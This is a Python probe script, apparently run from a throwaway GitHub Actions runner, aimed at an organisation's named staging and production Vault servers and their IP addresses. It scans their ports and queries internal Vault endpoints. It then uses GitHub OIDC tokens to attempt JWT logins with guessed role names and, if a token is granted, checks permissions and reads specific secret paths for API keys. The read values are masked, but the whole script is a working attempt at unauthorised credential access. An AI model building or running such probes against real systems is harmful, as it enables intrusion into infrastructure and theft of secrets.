#!/usr/bin/env python3
"""Read-only follow-up to run 43188307906 (vault-family-conn-11983b).

The TCP scan showed exactly one non-443 listener on the dev/staging vault family:
vault.staging.sonar.build @ 18.156.79.179 :80 accept().  Everything else on
vault.dev / vault-public.dev / vault-public.staging timed out on 443/8200/80.
Also prod vault.sonar.build accepted 8200.

This script (runs ONLY on our own throwaway repo's GitHub runner) does:
  A) TCP re-check (3 tries, 10s) for staging/prod A records on 80/8200/443
  B) raw HTTP(S) GET on any reachable 80/8200 listener for:
       /v1/sys/health, /v1/sys/seal-status,
       /v1/sys/internal/ui/mounts (X-Vault-Request: true),
       /v1/sys/internal/ui/namespaces, /  (root) + random control path
     (no redirect following, so a plain-HTTP ALB 301 is visible as such)
  C) only if a response body parses as Vault health: at most 3 jwt login attempts
     for that host (no-role, github-cballk-fabric-oidc-10548, ...-protected),
     and if a client_token is ever issued: lookup-self + capabilities-self and,
     only when read is granted, ONE exact known KV path.
No writes, no role/KV enumeration, no password injection, no brute force.
"""
import http.client
import json
import os
import socket
import ssl
import time
import urllib.parse
import urllib.request

# recorded + runner-observed A records
HOSTS = {
    "vault.staging.sonar.build": ["18.156.79.179", "3.121.195.183", "18.157.125.57", "3.125.135.87"],
    "vault-public.staging.sonar.build": ["3.125.135.87", "18.157.125.57", "3.121.195.183", "18.156.79.179"],
    "vault.sonar.build": ["18.198.153.112", "63.184.0.198", "35.156.3.249"],
    "vault-public.sonar.build": ["18.198.153.112", "63.184.0.198", "35.156.3.249"],
}
PORT_SCHEMES = {80: ["http"], 8200: ["https", "http"], 443: ["https"]}
RESULT = {"probe": "vault-staging-port80-12036", "tcp": {}, "http": {}, "logins": {}, "kv": {}}
REDIRECTS = (301, 302, 303, 307, 308)


def mask_val(v):
    if v is None:
        return None
    v = str(v)
    if len(v) <= 8:
        return "****"
    return v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def tcp(ip, port, tmo=10, tries=3):
    out = []
    for _ in range(tries):
        t0 = time.time()
        try:
            s = socket.create_connection((ip, port), timeout=tmo)
            s.close()
            out.append({"ok": True, "ms": int((time.time() - t0) * 1000)})
        except Exception as e:
            out.append({"ok": False, "ms": int((time.time() - t0) * 1000),
                        "err": f"{type(e).__name__}: {str(e)[:80]}"})
    return {"any_open": any(o["ok"] for o in out), "tries": out}


def raw_get(scheme, ip, host, port, path, extra=None, tmo=12, maxbody=6000):
    """Raw request: no redirect follow, full control of Host/SNI. Returns dict."""
    hdrs = {"Host": host, "User-Agent": "conn-probe/1.0", "Accept": "*/*",
            "Connection": "close"}
    if extra:
        hdrs.update(extra)
    req = (f"GET {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n").encode()
    t0 = time.time()
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=tmo)
        if scheme == "https":
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(req)
        s.settimeout(tmo)
        buf = b""
        while len(buf) < maxbody:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
        ms = int((time.time() - t0) * 1000)
        head, _, body = buf.partition(b"\r\n\r\n")
        lines = head.decode("latin-1", "replace").split("\r\n")
        status = None
        if lines and lines[0].startswith("HTTP/"):
            try:
                status = int(lines[0].split()[1])
            except Exception:
                pass
        hh = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                hh[k.strip().lower()] = v.strip()
        return {"scheme": scheme, "ip": ip, "host": host, "port": port, "path": path,
                "status": status, "ms": ms, "headers": hh,
                "body": body.decode("utf-8", "replace")[:2500]}
    except Exception as e:
        return {"scheme": scheme, "ip": ip, "host": host, "port": port, "path": path,
                "status": None, "ms": int((time.time() - t0) * 1000),
                "err": f"{type(e).__name__}: {str(e)[:120]}"}
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def control_path():
    return f"/__probe_control_{int(time.time())}_{os.getpid()}"


def looks_vault(resp):
    b = (resp.get("body") or "").strip()
    if not b.startswith("{"):
        return False
    try:
        j = json.loads(b)
    except Exception:
        return False
    return isinstance(j, dict) and ("initialized" in j or "sealed" in j or "cluster_id" in j)


def get_oidc_jwt(aud):
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not u or not t:
        return None, "no ACTIONS_ID_TOKEN_REQUEST_* env"
    sep = "&" if "?" in u else "?"
    url = u + sep + "audience=" + urllib.parse.quote(aud, safe="")
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {t}", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode()).get("value"), None
    except Exception as e:
        return None, f"{type(e).__name__}: {str(e)[:120]}"


def raw_post(scheme, ip, host, port, path, body_bytes, extra=None, tmo=20, maxbody=6000):
    hdrs = {"Host": host, "User-Agent": "conn-probe/1.0", "Accept": "*/*",
            "Content-Type": "application/json", "Content-Length": str(len(body_bytes)),
            "Connection": "close"}
    if extra:
        hdrs.update(extra)
    req = (f"POST {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n").encode() + body_bytes
    t0 = time.time()
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=tmo)
        if scheme == "https":
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(req)
        s.settimeout(tmo)
        buf = b""
        while len(buf) < maxbody:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
        head, _, body = buf.partition(b"\r\n\r\n")
        lines = head.decode("latin-1", "replace").split("\r\n")
        status = None
        if lines and lines[0].startswith("HTTP/"):
            try:
                status = int(lines[0].split()[1])
            except Exception:
                pass
        return {"status": status, "ms": int((time.time() - t0) * 1000),
                "body": body.decode("utf-8", "replace")[:3000]}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "err": f"{type(e).__name__}: {str(e)[:120]}"}
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def login(scheme, ip, host, port, aud, role=None):
    jwt, err = get_oidc_jwt(aud)
    if not jwt:
        return {"role": role, "aud": aud, "error": "oidc: " + (err or "no jwt")}
    payload = {"jwt": jwt}
    if role:
        payload["role"] = role
    r = raw_post(scheme, ip, host, port, "/v1/auth/jwt-ghwf/login",
                 json.dumps(payload).encode(), {"X-Vault-Request": "true"})
    out = {"role": role, "aud": aud, "status": r.get("status"), "ms": r.get("ms")}
    try:
        j = json.loads(r.get("body") or "{}")
        auth = j.get("auth") or {}
        tok = auth.get("client_token")
        out["client_token"] = ("issued len=%d" % len(tok)) if tok else None
        out["policies"] = auth.get("policies")
        if not tok:
            out["error"] = {k: v for k, v in j.items() if k != "auth"}
        if tok:
            # read-only self inspection; never print the token
            lk = raw_get(scheme, ip, host, port, "/v1/auth/token/lookup-self",
                         {"X-Vault-Token": tok, "X-Vault-Request": "true"})
            out["lookup_self"] = {"status": lk.get("status"),
                                  "body": (lk.get("body") or lk.get("err") or "")[:1200]}
            known = ["/v1/development/kv/data/code-security-diff-val-claude-code",
                     "/v1/development/kv/data/jira",
                     "/v1/development/kv/data/codenext/eval/anthropic",
                     "/v1/development/kv/data/codenext/eval/openai",
                     "/v1/development/kv/data/codenext/eval/gemini"]
            cp = raw_post(scheme, ip, host, port, "/v1/sys/capabilities-self",
                          json.dumps({"paths": known}).encode(),
                          {"X-Vault-Token": tok, "X-Vault-Request": "true"})
            out["capabilities_self"] = {"status": cp.get("status"),
                                        "body": (cp.get("body") or cp.get("err") or "")[:2000]}
            caps = {}
            try:
                caps = json.loads(cp.get("body") or "{}").get("data", {}).get("capabilities", {}) or {}
            except Exception:
                caps = {}
            for p in known:
                c = caps.get(p) or caps.get(p.replace("/v1/", ""))
                if c and any(x in c for x in ("read", "root", "sudo")):
                    r = raw_get(scheme, ip, host, port, p, {"X-Vault-Token": tok, "X-Vault-Request": "true"})
                    body = r.get("body") or ""
                    masked = body
                    try:
                        jj = json.loads(body)
                        dd = (jj.get("data") or {}).get("data") or {}
                        masked = {k: mask_val(v) for k, v in dd.items()}
                    except Exception:
                        pass
                    RESULT["kv"][p] = {"status": r.get("status"), "masked": masked}
    except Exception:
        out["error"] = r.get("body") or r.get("err")
    return out


def main():
    # A) TCP re-check
    for host, ips in HOSTS.items():
        RESULT["tcp"][host] = {}
        for ip in ips:
            RESULT["tcp"][host][ip] = {str(p): tcp(ip, p) for p in (80, 8200, 443)}

    # B) HTTP layer on any open 80/8200 listener (+ 443 for same host as baseline)
    for host, ips in HOSTS.items():
        RESULT["http"][host] = {}
        for ip in ips:
            if ip not in RESULT["tcp"][host]:
                continue
            for port, schemes in PORT_SCHEMES.items():
                if not RESULT["tcp"][host][ip][str(port)]["any_open"]:
                    continue
                for scheme in schemes:
                    key = f"{ip}:{port}/{scheme}"
                    RESULT["http"][host][key] = {}
                    probes = [
                        ("/v1/sys/health", {"X-Vault-Request": "true"}),
                        ("/v1/sys/seal-status", {"X-Vault-Request": "true"}),
                        ("/v1/sys/internal/ui/mounts", {"X-Vault-Request": "true"}),
                        ("/v1/sys/internal/ui/namespaces", {"X-Vault-Request": "true"}),
                        ("/", {"X-Vault-Request": "true"}),
                        (control_path(), {"X-Vault-Request": "true"}),
                    ]
                    vault_live = False
                    for path, extra in probes:
                        r = raw_get(scheme, ip, host, port, path, extra)
                        RESULT["http"][host][key][path] = r
                        if path == "/v1/sys/health" and looks_vault(r):
                            vault_live = True
                    RESULT["http"][host][key]["_vault_live"] = vault_live
                    RESULT["http"][host][key]["_is_redirect"] = any(
                        (RESULT["http"][host][key][p].get("status") in REDIRECTS)
                        for p, _ in probes if p != control_path())

                    # C) bounded login only against a live Vault listener on a non-443 port
                    if vault_live and port in (80, 8200) and not host.startswith("vault.sonar.build") \
                            and not host.startswith("vault-public.sonar.build"):
                        base_aud = f"https://{host}"
                        attempts = [(None, base_aud),
                                    ("github-cballk-fabric-oidc-10548", base_aud),
                                    ("github-cballk-fabric-oidc-10548-protected", base_aud)]
                        RESULT["logins"].setdefault(host, [])
                        for role, aud in attempts[:3]:
                            RESULT["logins"][host].append(login(scheme, ip, host, port, aud, role))

    print("===RESULT_JSON_START===")
    print(json.dumps(RESULT, indent=1, default=str))
    print("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
